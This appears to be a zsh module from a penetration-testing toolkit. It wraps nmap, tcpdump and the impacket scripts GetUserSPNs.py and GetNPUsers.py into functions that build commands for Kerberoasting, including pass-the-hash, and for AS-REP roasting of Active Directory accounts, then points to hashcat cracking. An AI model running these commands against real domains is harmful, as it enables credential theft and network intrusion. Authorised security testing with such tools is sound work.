#!/usr/bin/env zsh

############################################################# 
# nb-ad-kerb
#############################################################
nb-ad-kerb-help() {
    cat << "DOC" | bat --plain --language=help

nb-ad-kerb
------------
The nb-ad-kerb namespace contains commands for scanning and enumerating kerberos records and servers.

Commands
--------
nb-ad-kerb-install        installs dependencies
nb-ad-kerb-nmap-sweep     scan a network for services
nb-ad-kerb-tcpdump        capture traffic to and from a host
nb-ad-kerb-kerberoast     get SPN for a service account
nb-ad-kerb-asreproast     hunt for users with kerberoast pre-auth not required

DOC
}

nb-ad-kerb-install() {
    __info "Running $0..."
    __pkgs tcpdump nmap impacket
}

nb-ad-kerb-nmap-sweep() {
    __check-project
    nb-vars-set-network
    print -z "sudo nmap -n -Pn -sS -p88 ${__NETWORK} -oA $(__netadpath)/kerb-sweep"
}

nb-ad-kerb-tcpdump() {
    __check-project
    nb-vars-set-iface
    nb-vars-set-rhost
    print -z "sudo tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 88 -w $(__netadpath)/kerb.pcap"
}

nb-ad-kerb-kerberoast() {
    __check-project
    nb-vars-set-domain
    __ask "Enter any domain user account"
    nb-vars-set-user
    __ask "Enter the IP address of the target domain controller"
    nb-vars-set-rhost

    __ask "Do you want to log in using a password or a hash? (p/h)"
    local login && __askvar login "LOGIN_OPTION"

    if [[ $login == "p" ]]; then
        echo
        __ask "Enter a password for authentication"
        nb-vars-set-pass
        print -z "GetUserSPNs.py -request ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip ${__RHOST} -outputfile $(__domadpath)/kerberoast.txt"
    elif [[ $login == "h" ]]; then
        echo
        __ask "Enter the NT:LM hash for authentication"
        __check-hash
        print -z "sudo GetUserSPNs.py -hashes ${__HASH} ${__DOMAIN}/${__USER} -outputfile $(__domadpath)/kerberoast.txt"
    else
        __err "Invalid option. Please choose 'p' for password or 'h' for hash."
    fi
}

nb-ad-kerb-asreproast() {
  __ask "Did you enumerate users into a userlist file? (y/n)"
  local sh && __askvar sh "ANSWER"

  if [[ $sh == "n" ]]; then
    __err "You need a valid userlist file to perform asrep roasting."
    __info "Use nb-ad-enum-kerbrute-users."
    exit 1
  fi

	__ask "Enter the IP address of the target domain controller"
	nb-vars-set-rhost
  nb-vars-set-domain
	__ask "Enter a users wordlist"
  __askpath ul FILE $HOME/desktop/projects/

	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}/ -no-pass -usersfile $ul -format hashcat -outputfile $(__domadpath)/asrep-hashes.txt"

  __info "You can now crack this hash with mode '18200' using 'nb-crack-list'"
}
